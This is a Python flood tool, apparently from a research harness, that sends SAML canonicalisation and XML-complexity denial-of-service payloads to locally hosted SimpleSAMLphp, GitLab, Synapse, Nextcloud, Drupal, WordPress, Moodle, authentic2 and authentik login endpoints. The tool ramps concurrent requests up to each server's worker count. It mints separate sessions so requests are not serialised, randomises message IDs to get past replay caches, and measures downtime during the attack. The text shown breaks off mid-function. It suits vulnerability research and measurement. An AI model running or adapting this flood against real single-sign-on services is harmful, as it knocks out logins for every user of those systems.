#!/usr/bin/env python3
"""fire.py -- generate a payload (via saml_payloadgen) and send it to a local target container.

Pick a --target (sets host/port/path and AuthnRequest-vs-Response automatically) and the flood
params; fire once (default), or continuously with --interval / --workers. STRICTLY for local
Docker containers you control -- never a live system.

  python3 fire.py --target ssp-idp --vector reconcile --size 250          # one request
  python3 fire.py --target nextcloud --vector c14n-inc --size 1000         # one request (auto-login)
  python3 fire.py --target gitlab --vector c14n-inc --size 1000 \
                  --workers 96 --interval 2 --duration 120                 # sustained (fixed) load
  python3 fire.py --target ssp-idp --vector reconcile --size 430 \
                  --max-inflight 150 --duration 300                        # ramp to pool size, hold
  python3 fire.py --target synapse --vector c14n-exc --size 30000 --probe  # + liveness probe

Continuous runs fire non-blocking waves (the next wave fires on schedule; in-flight requests keep
running) and probe the SSO/ACS endpoint once/sec with a minimal benign message. --max-inflight N
ramps up in declining waves to N concurrent requests (= the server's worker count) then tops up to
hold there; --workers/--interval instead fire a fixed batch every interval.

Targets mirror saml_dos/profiles.py. --list shows them. Payload generation is delegated to
saml_payloadgen.py (so params/shapes stay identical to the paper's generator).
"""
import argparse, base64, itertools, os, re, subprocess, sys, threading, time, urllib.parse, zlib, queue
try:
    import requests
    import urllib3; urllib3.disable_warnings()
except ImportError:
    sys.exit("pip install requests")

HERE = os.path.dirname(os.path.abspath(__file__))
GEN = os.path.join(HERE, "saml_payloadgen.py")

PROBE_LITE_SIZE = 100   # default liveness probe: a LIGHTWEIGHT attack payload (small but complete,
                        # so it reaches the same served code path) -- size-1 is degenerate and some stacks
                        # (moodle/auth_saml2) 404 it instead of serving. Bump if a target still 404s the probe.
WORK_S = 1.0   # a flood request is "effective" (consumed real server CPU) if it took >= this many
               # seconds; faster completions are fast-rejects (over-cap, parse reject, or a 502
               # bounce) that did no work -- a heuristic cut, well below any real burn (seconds+).


def err_label(e):
    """Unwrap requests/urllib3 wrappers to the ROOT cause so ConnectionError doesn't hide WHY:
    e.g. ConnectionError/ConnectionResetError (server RST) vs .../RemoteDisconnected (worker
    exited) vs .../ConnectTimeoutError (backlog full). This distinction is the whole diagnosis."""
    root, seen = e, set()
    while id(root) not in seen:
        seen.add(id(root))
        nxt = getattr(root, "__cause__", None)
        if nxt is None and getattr(root, "args", None):
            nxt = next((a for a in root.args if isinstance(a, BaseException)), None)
        if nxt is None:
            break
        root = nxt
    top, base = type(e).__name__, type(root).__name__
    return f"ERR {top}/{base}" if base != top else f"ERR {top}"


def fail_predicate(t):
    """Return is_fail(status_code) for a target's probe. Products signal a downed backend
    differently -- GitLab returns a fast 502 (nginx has no live Puma upstream) that must count
    as a failure, not a 0.01s success. A target may set `fail_status` to an explicit set of
    codes; otherwise any 5xx on the benign probe is treated as a backend failure (a 4xx is a
    constant content rejection, unrelated to load, so it is NOT a failure)."""
    fs = t.get("fail_status")
    if fs is not None:
        codes = set(fs)
        return lambda c: c in codes
    return lambda c: c >= 500

# Server concurrency model per target -- the pool size to aim --max-inflight at, as spun up by
# run_target.sh. Prefork: a pinned worker is fully out of service, so filling the pool = total denial.
# GitLab: Puma workers x threads, but Nokogiri's canonicalize releases the Ruby GVL, so it browns out
# under CPU rather than hard-pinning. Synapse: one Twisted reactor -> a single C14N burn freezes the
# entire homeserver (pool of 1; no --max-inflight needed).
#   target           server model                    threads/workers   note
#   ssp-idp, ssp-sp  Apache mpm_prefork + mod_php     150               MaxRequestWorkers, Debian default
#   nextcloud        Apache mpm_prefork + mod_php     150               official image default (confirmed live)
#   moodle           Apache mpm_prefork + mod_php     ~150              bitnami/moodle (prefork; embeds SSP)
#   drupal           Apache mpm_prefork + mod_php     150               drupal:11-apache (php:apache default)
#   wordpress        Apache mpm_prefork + mod_php     150               wordpress:latest (php:apache default)
#   gitlab           Puma: workers x threads          ~cores x 4        Omnibus auto-sizes workers to host
#   authentic2-*     gunicorn sync workers            16                WORKERS=16 (1 request per worker)
#   authentik-sp     gunicorn/uvicorn async workers   ~cores x 1        Python/lxml/xmlsec (not libxml2-in-PHP)
#   synapse          single Twisted reactor thread    1                 one burn freezes the whole server
# Verify live -- prefork: docker exec <c> grep MaxRequestWorkers /etc/apache2/mods-enabled/mpm_prefork.conf
#                gitlab:  docker exec gitlab grep -E 'workers|threads' /var/opt/gitlab/gitlab-rails/etc/puma.rb
#                gunicorn: docker exec authentic2-poc sh -c 'ps -C gunicorn --no-headers | wc -l'  (workers+1 master)
#
def slot_for(t, vector):
    """The target's `slot` is calibrated for its DEFAULT vector (e.g. ssp-sp's anyattr is
    exactly where SimpleSAMLphp fires C5/attr). When the user overrides --vector, that slot no
    longer applies -- an element vector (c14n-*/xpath) put in the anyattr slot is DROPPED by the
    generator, yielding a tiny inert message. So honour the target slot only when firing the
    target's own vector; otherwise let saml_payloadgen pick the vector's natural slot."""
    if not t.get("slot"):
        return None
    try:
        from saml_payloadgen import resolve_vector
        same = resolve_vector(vector) == resolve_vector(t["vector"])
    except Exception:
        same = (vector == t["vector"])       # fall back to a raw compare if the import fails
    return t["slot"] if same else None


# target -> wire location + how saml_payloadgen must shape the message to reach the sink.
# msg: authnrequest|response ; login: mint a cookie+InResponseTo first (strict-mode SPs).
TARGETS = {
    "ssp-idp":    dict(url="http://localhost:8091/module.php/saml/idp/singleSignOnService",
                       msg="authnrequest", vector="reconcile", size=250,
                       sp_entity="https://sp.test/metadata"),
    "ssp-sp":     dict(url="http://localhost:8090/module.php/saml/sp/saml2-acs.php/default-sp",
                       msg="response", vector="attr", size=40000, slot="anyattr",
                       fail_status=(502, 503, 504),   # SimpleSAMLphp returns a served 500 on ANY
                       # SAMLResponse (sink runs, signature check then fails) -- 500 is the healthy
                       # served response, so only gateway-down codes count as denial (plus timeouts).
                       idp_entity="https://idp.test/metadata",
                       sp_entity="http://localhost:8090/module.php/saml/sp/metadata.php/default-sp"),
    "synapse":    dict(url="http://127.0.0.1:8008/_synapse/client/saml2/authn_response",
                       msg="response", vector="c14n-exc", size=30000, c14n="exc",
                       dual_sign=True, relay_state="x", idp_entity="http://idp.example.test/metadata"),
    "gitlab":     dict(url="http://127.0.0.1:80/users/auth/saml/callback", host="gitlab.example.com",
                       msg="response", vector="c14n-inc", size=1000, fail_status=(500, 502, 503, 504),
                       idp_entity="http://idp.example.test/sso", sp_entity="http://gitlab.example.com"),
    "wordpress":  dict(url="http://localhost:8889/", msg="response", vector="c14n-exc", size=8000,
                       c14n="exc", relay_state="/", idp_entity="https://evil-idp.test/metadata",
                       fail_status=(502, 503, 504)),   # miniOrange returns 500 on ANY SAMLResponse
                       # (sink fired, validation then fails) -- 500 is the healthy/served response
                       # here, so only gateway-down codes count as denial (plus timeouts/errors).
    "nextcloud":  dict(url="http://127.0.0.1:8080/index.php/apps/user_saml/saml/acs",
                       login="http://127.0.0.1:8080/apps/user_saml/saml/login?idp=1",
                       msg="response", vector="c14n-inc", size=1000,
                       idp_entity="https://evil-idp.test/metadata"),
    "drupal":     dict(url="http://localhost:8083/saml/acs", msg="response", vector="c14n-inc",
                       size=1000, dual_sign=True,
                       fail_status=(502, 503, 504),   # samlauth returns a served 500 on a
                       # SAMLResponse whose signature then fails (sink ran) -- like SimpleSAMLphp,
                       # 500 is the healthy served response, so only gateway-down codes = denial.
                       idp_entity="https://evil-idp.test/metadata",
                       sp_entity="http://localhost:8083/saml/metadata"),
    "authentic2-sp":  dict(url="http://localhost:8092/accounts/saml/login/", msg="response",
                           vector="c14n-exc", size=8000, c14n="exc", idp_entity="https://evil-idp.test/"),
    "authentic2-idp": dict(url="http://localhost:8092/idp/saml2/sso", msg="authnrequest",
                           vector="reconcile", size=250, sp_entity="https://evil-idp.test/"),
    # Moodle: auth_saml2 EMBEDS SimpleSAMLphp, so it mirrors ssp-sp exactly (attr/anyattr sink, served
    # 500 on any Response). ACS path's trailing 'localhost' = the wwwroot hostname (=spname); if
    # run_target's discovered ACS differs, update this url. idp_entity must match the configured IdP.
    "moodle":     dict(url="http://localhost:8082/auth/saml2/sp/saml2-acs.php/localhost",
                       msg="response", vector="attr", size=40000, slot="anyattr",
                       fail_status=(502, 503, 504),   # embedded SSP returns a served 500, like ssp-sp
                       idp_entity="https://evil-idp.test/metadata",
                       sp_entity="http://localhost:8082/auth/saml2/sp/metadata.php"),
    # authentik SP role: verifies a signed SAMLResponse via lxml/xmlsec -> C14N sink (c14n-exc/inc).
    # dual_sign: authentik validates the Response (or Assertion) signature; both are signed to be safe.
    "authentik-sp":  dict(url="http://127.0.0.1:9000/source/saml/dos-src/acs/",
                          msg="response", vector="c14n-exc", size=8000, c14n="exc", dual_sign=True,
                          # A landed Response canonicalizes for tens of seconds; a shed one (past the
                          # ~cores concurrent-processing ceiling, or over Django's 2.5MiB POST cap)
                          # bounces in <1s. work_s=5 separates a real slot from a queued-then-rejected
                          # request. NB: the status code is a CONSTANT 405 for both -- latency is the
                          # only signal, so watch `landed/shed/med`, not `codes`.
                          work_s=5.0,
                          # Probe does REAL bounded work so served != shed by latency alone (the
                          # status is a constant 405 either way). Must MATCH the flood's c14n so it
                          # does NOT blow up: c14n-inc @12000 under the target's c14n=exc is ~0.5s
                          # of parse/verify (the inclusive path is O(K*N^2) and would time out --
                          # so DON'T set probe_c14n=inc; inherit exc). A shed/bounced probe returns
                          # in ~0.05s. floor=0.2 sits cleanly between served and bounced.
                          probe_vector="c14n-inc", probe_size=12000,
                          probe_floor=0.2,
                          idp_entity="https://evil-idp.test/metadata"),
    # authentik IdP role: receives an AuthnRequest. No verification_kp is configured, so the request
    # carries NO checked signature -> the only reachable sink is PARSE-time (ns-flood), not C14N.
    # (May read linear if the host libxml2 has the 2.14.6 ns-parse fix -- that's the finding to record.)
}


def start_login(login_url):
    """GET the SP login endpoint; return (cookie_dict, InResponseTo id) for strict-mode SPs.
    Degrades gracefully: if the endpoint doesn't answer (target already saturated/down from a
    prior run), warn and return empty rather than crashing the tool before it even fires."""
    try:
        r = requests.get(login_url, allow_redirects=False, verify=False, timeout=30)
    except Exception as e:
        print(f"# warning: login GET failed ({err_label(e)}) -- target likely saturated/down "
              f"(a prior run may still be pinning workers). Proceeding without cookie/InResponseTo; "
              f"if this persists, restart the target container.", flush=True)
        return {}, None
    cookies = r.cookies.get_dict()
    loc = r.headers.get("Location", "")
    q = urllib.parse.parse_qs(urllib.parse.urlparse(loc).query)
    req_id = None
    if "SAMLRequest" in q:
        try:
            xml = zlib.decompress(base64.b64decode(q["SAMLRequest"][0]), -15).decode()
            m = re.search(r'\bID="([^"]+)"', xml); req_id = m.group(1) if m else None
        except Exception:
            pass
    return cookies, req_id


def gen_body(t, args, req_id=None):
    """Build the url-encoded POST body by calling saml_payloadgen --encode form."""
    argv = [sys.executable, GEN, "--vector", args.vector or t["vector"],
            "--message", t["msg"], "--size", str(args.size if args.size is not None else t["size"]),
            "--encode", "form"]
    for flag, key in [("--n", "n"), ("--k", "k"), ("--depth", "depth"), ("--width", "width")]:
        v = getattr(args, key.lstrip("-"), None)
        if v is not None:
            argv += [flag, str(v)]
    if t.get("c14n"):        argv += ["--c14n", t["c14n"]]
    _slot = slot_for(t, args.vector or t["vector"])
    if _slot:                argv += ["--slot", _slot]
    if t.get("dual_sign"):   argv += ["--dual-sign"]
    if t.get("relay_state") is not None: argv += ["--relay-state", t["relay_state"]]
    if t.get("idp_entity"):  argv += ["--idp-entity", t["idp_entity"]]
    if t.get("sp_entity"):   argv += ["--sp-entity", t["sp_entity"]]
    argv += ["--acs-url", t["url"], "--req-id", req_id or "_req"]
    out = subprocess.run(argv, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return out.stdout.strip(), out.stderr.strip()


def mint_session(t, args):
    """Mint one INDEPENDENT SP session: a fresh SP-initiated login (its own cookie + InResponseTo)
    plus a body whose InResponseTo matches it. Returns (cookies, body, nbytes) or None on failure.
    Distinct sessions are what let concurrent requests run in parallel -- PHP locks a session file
    for a request's whole duration, so requests sharing one cookie serialize (one worker, one core)."""
    cookies, req_id = start_login(t["login"])
    if not cookies:
        return None                              # login endpoint didn't answer (already warned)
    body, _ = gen_body(t, args, req_id)
    if not body:
        return None
    return (cookies, body, len(body.encode()))


def build_session_pool(t, args, n, parallel=16):
    """Pre-mint n independent sessions (bounded concurrency) into a Queue for checkout/checkin.
    Returns (queue, minted_count). Sessions are reused across requests over time (each session keeps
    its InResponseTo), but never by two requests at once, so no session-lock serialization."""
    slots = [None] * n
    idx = iter(range(n))
    lock = threading.Lock()
    def worker():
        while True:
            with lock:
                i = next(idx, None)
            if i is None:
                return
            slots[i] = mint_session(t, args)
    ths = [threading.Thread(target=worker) for _ in range(min(parallel, n))]
    for th in ths: th.start()
    for th in ths: th.join()
    pool = queue.Queue()
    for s in slots:
        if s: pool.put(s)
    return pool, pool.qsize()


def gen_probe_body(t, vector, req_id=None, heavy=False):
    """A BENIGN message of the same message-type the flood uses, aimed at the SAME endpoint, so
    the liveness probe measures what a *legitimate SSO request* experiences under load (not a
    cheap unrelated GET / on a different code path).

    DEFAULT (heavy=False): a LIGHTWEIGHT attack payload (small but structurally complete, see
    PROBE_LITE_SIZE) so the target serves it quickly on the SAME code path as the flood and a fast
    return == available -- size-1 is degenerate and some stacks 404 it. This is right for almost
    everything -- most products
    signal a downed backend with a distinct status (a 5xx / a product `fail_status`), so the cheap
    probe already distinguishes served from failed.

    heavy=True: used ONLY when the caller is generating concurrent load against a target whose
    SERVED status is a CONSTANT (authentik: 405 whether it canonicalized for 40s or bounced the
    connection in 50ms) -- there a size-1 probe can't be told apart from a shed one (both ~instant
    405). Then the target's `probe_size`/`probe_vector`/`probe_c14n` make the probe do a small but
    NON-TRIVIAL amount of real work (c14n-inc @12000 ~= 0.5s served vs ~0.05s bounced) so latency
    alone separates served from shed; pair with `probe_floor` to classify it."""
    pv = t.get("probe_vector", vector) if heavy else vector
    psz = str(t.get("probe_size", 1)) if heavy else str(PROBE_LITE_SIZE)
    argv = [sys.executable, GEN, "--vector", pv, "--message", t["msg"],
            "--size", psz, "--encode", "form"]
    pc14n = (t.get("probe_c14n", t.get("c14n")) if heavy else t.get("c14n"))
    if pc14n:                argv += ["--c14n", pc14n]
    _slot = slot_for(t, pv)
    if _slot:                argv += ["--slot", _slot]
    if t.get("dual_sign"):   argv += ["--dual-sign"]
    if t.get("relay_state") is not None: argv += ["--relay-state", t["relay_state"]]
    if t.get("idp_entity"):  argv += ["--idp-entity", t["idp_entity"]]
    if t.get("sp_entity"):   argv += ["--sp-entity", t["sp_entity"]]
    argv += ["--acs-url", t["url"], "--req-id", req_id or "_req"]
    out = subprocess.run(argv, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return out.stdout.strip()


class Stats:
    """Thread-safe accumulator: total bytes sent + first-start/last-end wall clock."""
    def __init__(self):
        self.lock = threading.Lock()
        self.bytes_sent = 0
        self.first_start = None
        self.last_end = None

    def record(self, start, end, nbytes):
        with self.lock:
            self.bytes_sent += nbytes
            if self.first_start is None or start < self.first_start:
                self.first_start = start
            if self.last_end is None or end > self.last_end:
                self.last_end = end


class ProbeStats:
    """Per-phase probe outcomes. Written only by the single probe thread; read after it joins
    (no lock needed). Bucketing by phase matters because the probe is serial (one at a time,
    up to a 30s timeout): under saturation a hanging probe throttles the issue rate, so sustain
    yields few slow/failed samples while ramp/recovery yield ~1/s of fast ones. Pooling them
    would let the fast samples dilute the sustain failure rate and average -- so keep them apart."""
    PHASES = ("ramp", "sustain", "recovery")
    def __init__(self, floor=0.0):
        self.floor = floor          # served-work probes below this returned WITHOUT being served
        self.n = {p: 0 for p in self.PHASES}
        self.failed = {p: 0 for p in self.PHASES}
        self.times = {p: [] for p in self.PHASES}          # latencies of SERVED probes only
        self.reasons = {p: {} for p in self.PHASES}        # failure reason -> count
        self.avail_s = {p: 0.0 for p in self.PHASES}       # wall-clock attributed to served probes
        self.unavail_s = {p: 0.0 for p in self.PHASES}     # wall-clock attributed to failed probes

    def add_wall(self, phase, failed, secs):
        """Attribute one probe's full cycle (its own duration + the sleep until the next probe)
        to available/unavailable by outcome. This is TIME-weighted, not per-probe: a 30s hung
        probe books 30s of downtime, so a serial probe's under-sampling of slow failures can't
        make an outage look rare."""
        (self.unavail_s if failed else self.avail_s)[phase] += secs

    def record(self, phase, pt, code, is_fail):
        """Classify one probe. A probe FAILS if it errored (no response), was unresponsive
        (>10s), returned a product-specific backend-failure status (is_fail(code)) -- e.g.
        a GitLab 502 at 0.01s is a dead-backend failure, not a fast success -- OR, when a floor
        is set, came back FASTER than a served request possibly could (self.floor): with a
        work-doing probe that means the server bounced it without doing the work (shed), which is
        a denial even though the status looks benign. Only SERVED probes feed the average latency."""
        self.n[phase] += 1
        if pt is None:
            reason = str(code)                             # err_label string (conn error)
        elif isinstance(pt, float) and pt > 10:
            reason = "slow(>10s)"
        elif isinstance(code, int) and is_fail(code):
            reason = f"HTTP {code}"
        elif self.floor and isinstance(pt, float) and pt < self.floor:
            reason = f"bounced(<{self.floor:g}s)"          # returned before it could be served == shed
        else:
            reason = None
        if reason is None:
            self.times[phase].append(pt)                   # served: counts toward avg latency
            return False
        self.failed[phase] += 1
        self.reasons[phase][reason] = self.reasons[phase].get(reason, 0) + 1
        return True


UNIQUE_IDS = True          # give every flood request a fresh Response/Assertion ID (below)
_IDSEQ = itertools.count(1)

def _mutate_ids(form_body):
    """Rewrite the fixed _resp/_assert ID tokens (ID attribute AND matching ds:Reference URI)
    to a per-request unique value, so a one-time-use / replay cache cannot fast-reject the flood
    as duplicates (e.g. Moodle's auth_saml2 bouncing identical Responses before the C14N sink).
    Round-trips through the SAME urlencode(base64(xml)) form the generator produced, so it is
    byte-transparent apart from the IDs; returns the body unchanged on any error."""
    try:
        u = str(next(_IDSEQ))
        fields = dict(urllib.parse.parse_qsl(form_body, keep_blank_values=True))
        for pname in ("SAMLResponse", "SAMLRequest"):
            if pname in fields:
                xml = base64.b64decode(fields[pname]).decode()
                xml = xml.replace("_resp", "_resp" + u).replace("_assert", "_assert" + u)
                fields[pname] = base64.b64encode(xml.encode()).decode()
        return urllib.parse.urlencode(fields)
    except Exception:
        return form_body


def send_once(t, body, cookies, headers, nbytes, stats):
    if UNIQUE_IDS:
        body = _mutate_ids(body); nbytes = len(body.encode())
    t0 = time.perf_counter()
    try:
        r = requests.post(t["url"], data=body, cookies=cookies, headers=headers,
                          verify=False, timeout=600, allow_redirects=False)
        dt = time.perf_counter() - t0
        stats.record(t0, t0 + dt, nbytes)
        return dt, r.status_code
    except Exception as e:
        dt = time.perf_counter() - t0
        stats.record(t0, t0 + dt, nbytes)   # count attempted volume even on error
        return dt, err_label(e)


def probe(t, body, cookies, headers, timeout=30):
    if UNIQUE_IDS:
        body = _mutate_ids(body)   # a real legit request has a fresh ID each time, so the probe
                                   # must too, or a replay cache rejects it and corrupts the measurement
    """POST a minimal benign message to the SAME endpoint the flood targets, to measure whether
    a legitimate request still gets served under load. Returns (seconds, status) or (None, err).
    `timeout` is short during calibration so an over-expensive probe aborts fast (reads too-big)."""
    try:
        t0 = time.perf_counter()
        r = requests.post(t["url"], data=body, cookies=cookies, headers=headers,
                          verify=False, timeout=timeout, allow_redirects=False)
        return time.perf_counter() - t0, r.status_code
    except Exception as e:
        return None, err_label(e)


def probe_loop(t, body, cookies, headers, pstats, phase_state, is_fail, stop_event,
               backend_down=None, probe_shed=None, interval=1.0, recovered_event=None):
    """Fire one probe per `interval` seconds until stop_event is set, bucketing each into the
    phase it was ISSUED in (phase_state[0], updated by the main thread). Failure = errored,
    unresponsive (>10s), or a product-specific backend-failure status (is_fail). Also flips
    backend_down when the backend isn't SERVING (errored or fail status) -- but NOT merely slow,
    since a slow-but-served probe means the DoS is working and the flood should keep going.

    probe_shed[0] is a SEPARATE flag: True when the last (work-doing) probe was BOUNCED -- a
    benign status returned faster than the floor, i.e. a legit request was shed without service
    because the server is past capacity. The flood loop uses it to STOP replenishing the in-flight
    pool (firing more just adds bounces) until a slot frees and the probe is served again. Only
    meaningful with a floor set (heavy probe); with the minimal probe it stays False (no gating)."""
    next_t = time.perf_counter()
    prev = None                                      # (phase, failed, start) of the previous probe
    rec_streak = 0                                   # consecutive served recovery probes under 10s
    while not stop_event.is_set():
        start = time.perf_counter()
        if prev is not None:                         # book the previous probe's full cycle now that
            pstats.add_wall(prev[0], prev[1], start - prev[2])   # we know when the next one began
        phase = phase_state[0]                       # tag by server state at issue time
        pt, pc = probe(t, body, cookies, headers)
        failed = pstats.record(phase, pt, pc, is_fail)
        if recovered_event is not None:    # recovery ends after TWO consecutive served probes
            if phase == "recovery":        # under 10s (one fast success could be a fluke)
                good = (not failed) and isinstance(pt, float) and pt < 10.0
                rec_streak = rec_streak + 1 if good else 0
                if rec_streak >= 2:
                    recovered_event.set()
            else:
                rec_streak = 0
        if backend_down is not None:
            backend_down[0] = (pt is None) or (isinstance(pc, int) and is_fail(pc))
        if probe_shed is not None:
            probe_shed[0] = (bool(pstats.floor) and isinstance(pt, float) and pt < pstats.floor
                             and not (isinstance(pc, int) and is_fail(pc)))
        prev = (phase, failed, start)
        next_t += interval
        wait = next_t - time.perf_counter()
        if wait > 0:
            stop_event.wait(wait)
        else:
            next_t = time.perf_counter()   # fell behind; resync
    if prev is not None:                             # attribute the final probe up to shutdown
        pstats.add_wall(prev[0], prev[1], time.perf_counter() - prev[2])


def print_summary(stats, pstats=None):
    if pstats is not None:
        for p in ProbeStats.PHASES:
            n = pstats.n[p]
            if not n:
                continue                             # phase never ran (e.g. no ramp in fixed mode)
            times = pstats.times[p]
            avg = sum(times) / len(times) if times else None
            avg_s = f"{avg:.2f}s" if avg is not None else "n/a"
            pct = 100 * pstats.failed[p] / n
            unavail, avail = pstats.unavail_s[p], pstats.avail_s[p]
            tot = unavail + avail
            downpct = 100 * unavail / tot if tot else 0.0
            reasons = pstats.reasons[p]
            brk = ("  [" + ", ".join(f"{r}x{c}" for r, c in
                   sorted(reasons.items(), key=lambda kv: -kv[1])) + "]") if reasons else ""
            print(f"# probes [{p:<8}]: {n:>3} sent, avg served={avg_s:>7}, "
                  f"failed={pstats.failed[p]}/{n} ({pct:.0f}%), "
                  f"unavailable {unavail:.0f}/{tot:.0f}s ({downpct:.0f}% of time){brk}")
    if stats.first_start is not None and stats.last_end is not None:
        span = stats.last_end - stats.first_start
        gbps = (stats.bytes_sent * 8 / 1e9 / span) if span > 0 else float("inf")
        print(f"# volume: {stats.bytes_sent/1e6:.1f} MB ({stats.bytes_sent} bytes) sent "
              f"over {span:.1f}s (first request -> last completion) = {gbps:.4f} Gbps")


def build_json(target, vector, nbytes, max_inflight, duration, mode, stats, pstats, req=None):
    """Assemble the machine-readable per-run record the harness aggregates. The HEADLINE metric is
    totals.ratio_unavail_s_per_byte = (sum of per-phase victim-unavailable seconds) / (attacker bytes
    sent) -- a cost ratio that cancels the heterogeneous absolute scales across targets."""
    span = ((stats.last_end - stats.first_start)
            if (stats.first_start is not None and stats.last_end is not None) else 0.0)
    probes, tot_unavail, tot_avail = {}, 0.0, 0.0
    if pstats is not None:
        for ph in ProbeStats.PHASES:
            n = pstats.n[ph]
            if not n:
                continue
            times = pstats.times[ph]
            avg = (sum(times) / len(times)) if times else None
            probes[ph] = dict(n=n, failed=pstats.failed[ph],
                              avail_s=round(pstats.avail_s[ph], 3),
                              unavail_s=round(pstats.unavail_s[ph], 3),
                              avg_served_s=(round(avg, 3) if avg is not None else None),
                              reasons=dict(pstats.reasons[ph]))
            tot_unavail += pstats.unavail_s[ph]
            tot_avail += pstats.avail_s[ph]
    ratio = (tot_unavail / nbytes) if nbytes else None     # headline: downtime-seconds per attacker byte
    obj = dict(
        target=target, vector=vector, mode=mode,
        max_inflight=max_inflight, duration=duration,
        volume=dict(bytes_sent=stats.bytes_sent, span_s=round(span, 3),
                    gbps=(round(stats.bytes_sent * 8 / 1e9 / span, 6) if span > 0 else None)),
        probes=probes,
        totals=dict(unavailable_s=round(tot_unavail, 3), available_s=round(tot_avail, 3),
                    bytes_sent=stats.bytes_sent,
                    ratio_unavail_s_per_byte=(None if ratio is None else float(f"{ratio:.6e}"))))
    if req is not None:
        obj["requests"] = req
    return obj


def write_json(path, obj):
    import json
    txt = json.dumps(obj, indent=2)
    if path == "-":
        print(txt)
    else:
        with open(path, "w") as f:
            f.write(txt + "\n")
        print(f"# json: wrote {path}", flush=True)


def main():
    ap = argparse.ArgumentParser(description="Generate + send a SAML complexity payload to a "
                                             "LOCAL target container.")
    ap.add_argument("--target", help=f"one of: {', '.join(TARGETS)}")
    ap.add_argument("--vector", help="override the target's default vector (FlAttr/C14N1D3/XPlode/"
                                     "Wreckoncile/NSpew or c14n-inc/... accepted)")
    ap.add_argument("--size", type=int, help="primary scale knob (per-target default otherwise)")
    ap.add_argument("--n", type=int); ap.add_argument("--k", type=int)
    ap.add_argument("--depth", type=int); ap.add_argument("--width", type=int)
    ap.add_argument("--workers", type=int, default=1, help="concurrent requests per wave (default 1)")
    ap.add_argument("--interval", type=float, help="repeat every N seconds (continuous; default 5 "
                                                   "with --max-inflight)")
    ap.add_argument("--max-inflight", type=int, dest="max_inflight",
                    help="target concurrent in-flight requests (= server worker count). Ramps up in "
                         "declining waves, then tops up to hold at saturation. Overrides --workers.")
    ap.add_argument("--duration", type=float, help="stop after N seconds (with --interval)")
    ap.add_argument("--probe", action="store_true", help="GET the site root to gauge liveness "
                                                         "(per-wave for one-shot; continuous mode "
                                                         "always probes once/sec in the background)")
    ap.add_argument("--probe-size", type=int, dest="probe_size", metavar="N",
                    help="use the WORK-DOING liveness probe (a benign message of size N on the same "
                    "endpoint) instead of the minimal size-1 probe, so served-vs-shed is told apart "
                    "by LATENCY -- needed on any target whose served status is constant / that fast-"
                    "bounces legit requests with a benign code. Defaults to the attack vector unless "
                    "--probe-vector is given. Pair with --probe-floor.")
    ap.add_argument("--probe-vector", dest="probe_vector", metavar="VEC",
                    help="vector for the work-doing probe (default: the attack vector)")
    ap.add_argument("--probe-floor", type=float, dest="probe_floor", metavar="SECONDS",
                    help="a work-doing probe that returns FASTER than this was bounced without being "
                    "served (shed) -> counts as unavailable. Set below the served latency, above an "
                    "instant bounce; the harness calibrates it from each target's idle probe.")
    ap.add_argument("--sessions", type=int, help="for login (per-session-cookie) targets in "
                    "continuous mode: size of the distinct-session pool so concurrent requests "
                    "don't serialize on one PHP session lock (default: --max-inflight, else --workers)")
    ap.add_argument("--no-login", action="store_true", help="skip the SP-initiated login entirely "
                    "and flood with no cookie (models a pure unauthenticated attacker; only reaches "
                    "the sink if the C14N runs before the InResponseTo/session check)")
    ap.add_argument("--dry-run", action="store_true", help="print body size, do not send")
    ap.add_argument("--json", metavar="PATH", help="also write a machine-readable JSON summary to "
                    "PATH ('-' = stdout); carries the headline unavailable_s/bytes_sent ratio for "
                    "the comparability harness")
    ap.add_argument("--probe-only", type=float, metavar="SECONDS", dest="probe_only",
                    help="idle CONTROL run: fire NO attack; run only the liveness probe for SECONDS "
                    "to baseline a legit request on the same endpoint (proves the denial is the attack)")
    ap.add_argument("--recovery-timeout", type=float, default=300.0, dest="recovery_timeout",
                    metavar="SECONDS", help="in continuous/max-inflight mode, end the recovery "
                    "phase once TWO consecutive legit probes are served in <10s; this is a "
                    "safety cap on how long to wait for that (default 300; 0 = wait "
                    "indefinitely)")
    ap.add_argument("--probe-timeout", type=float, default=None, dest="probe_timeout", metavar="SECONDS",
                    help="per-probe HTTP timeout for --calibrate (default 30); short values let an "
                    "over-expensive calibration probe abort fast and read as too-big")
    ap.add_argument("--calibrate", type=int, metavar="N", dest="calibrate",
                    help="calibration mode: fire N sequential liveness probes (no attack), discard "
                    "the first (warmup), emit served-latency stats as JSON. Uses --probe-size/"
                    "--probe-vector (minimal size-1 probe if --probe-size omitted). For the "
                    "harness work-probe auto-tuner.")
    ap.add_argument("--unique-ids", dest="unique_ids", action=argparse.BooleanOptionalAction,
                    default=True, help="per-request Response/Assertion IDs so a replay cache "
                    "can't fast-reject the identical flood (default on; --no-unique-ids to disable)")
    ap.add_argument("--list", action="store_true")
    a = ap.parse_args()
    global UNIQUE_IDS; UNIQUE_IDS = a.unique_ids

    if a.list or not a.target:
        for name, t in TARGETS.items():
            print(f"  {name:<15} {t['msg']:<13} default={t['vector']:<11} -> {t['url']}")
        return 0
    if a.target not in TARGETS:
        sys.exit(f"unknown --target '{a.target}'; known: {', '.join(TARGETS)}")
    t = dict(TARGETS[a.target])   # copy: CLI probe overrides below must not mutate the global
    if a.probe_size is not None:   t["probe_size"] = a.probe_size
    if a.probe_vector:             t["probe_vector"] = a.probe_vector
    if a.probe_floor is not None:  t["probe_floor"] = a.probe_floor
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    if t.get("host"): headers["Host"] = t["host"]

    cookies, req_id = ({}, None)
    if t.get("login") and not a.no_login:
        cookies, req_id = start_login(t["login"])
        print(f"# login: cookie={'yes' if cookies else 'NONE'} InResponseTo={req_id}")
    elif t.get("login") and a.no_login:
        print("# --no-login: flooding with no cookie (pure pre-auth attacker; only reaches the "
              "sink if C14N runs before the InResponseTo/session check)")

    if a.calibrate:
        # Fire N back-to-back probes (no attack) and report the served-latency distribution.
        # The work-doing probe (--probe-size) measures a real-work legit request; without it a
        # size-1 probe gives the trivial/shed baseline. The first sample is discarded (warmup:
        # opcache compile, cold caches). The harness grows --probe-size across calls until the
        # served cloud separates from the baseline with confidence, then sets the shed floor.
        import statistics as _st
        heavy = bool(t.get("probe_size"))
        pbody = gen_probe_body(t, a.vector or t["vector"], req_id, heavy=heavy)
        if not pbody:
            sys.exit("probe payload generation failed")
        is_fail = fail_predicate(t)
        ctimeout = a.probe_timeout if a.probe_timeout else 30
        samples = [probe(t, pbody, cookies, headers, timeout=ctimeout) for _ in range(max(1, a.calibrate))]
